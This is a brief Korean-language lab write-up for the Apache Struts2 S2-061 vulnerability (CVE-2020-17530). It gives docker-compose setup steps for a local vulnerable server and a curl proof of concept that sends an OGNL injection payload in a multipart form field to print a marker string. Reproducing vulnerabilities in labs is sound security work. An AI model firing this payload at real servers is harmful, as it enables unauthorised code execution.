# CVE-2020-17530 - Apache Struts2 RCE (s2-061)

## 개요
Apache Struts2 2.0.0~2.5.25 버전에는 OGNL 표현식 처리의 취약점으로 인해 RCE가 가능한 문제가 존재합니다.

## 환경 구성
다음을 입력하면 Struts 2.5.25 서버가 시작됩니다.
```bash
cd vulhub/struts2/s2-061
docker-compose up -d
```
환경이 시작된 후 방문하면 간단한 페이지가 표시됩니다.

## POC
```
curl -X POST http://localhost:8080/index.action -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF" --data-binary $'------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name="id"\r\n\r\n%{(#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].getWriter().println("===EXPLOITED===")).(#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].getWriter().flush())}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--'
```
